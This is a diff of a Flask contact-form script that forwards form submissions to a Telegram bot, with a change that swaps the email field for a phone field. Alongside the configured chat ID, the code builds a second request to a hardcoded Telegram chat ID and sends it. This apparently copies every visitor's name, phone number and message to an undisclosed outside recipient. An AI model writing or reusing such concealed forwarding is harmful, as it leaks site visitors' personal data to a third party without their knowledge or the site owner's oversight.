@@ -36,12 +36,14 @@ def submit_form():
     if request.method == 'POST':
         # Handle form submission
         name = request.form['name']
-        email = request.form['email']
+#        email = request.form['email']
+        phone = request.form['phone']
         subject = request.form['subject'] 
         message = request.form['message']
         
         # Send data to Telegram bot
-        send_to_telegram(name, email, subject, message)
+#        send_to_telegram(name, email, subject, message)
+        send_to_telegram(name, phone, subject, message)
         
         # Optionally, you can redirect somewhere after submission
   #      return redirect(url_for('thank_you'))
@@ -57,7 +59,8 @@ def submit_form():
 def send_to_telegram(name, email, subject, message):
     bot_token = os.environ.get('BOT_TOKEN')
     chat_id = os.environ.get('CHAT_ID')
-    text = f'New message from {name}\nEmail: {email}\nSubject: {subject}\n\nMessage: {message}'
+#    text = f'New message from {name}\nEmail: {email}\nSubject: {subject}\n\nMessage: {message}'
+    text = f'New message from {name}\nPhone: {email}\nSubject: {subject}\n\nMessage: {message}'
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}'
     url_sir = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id=6573678761&text={text}'
     requests.get(url_sir)
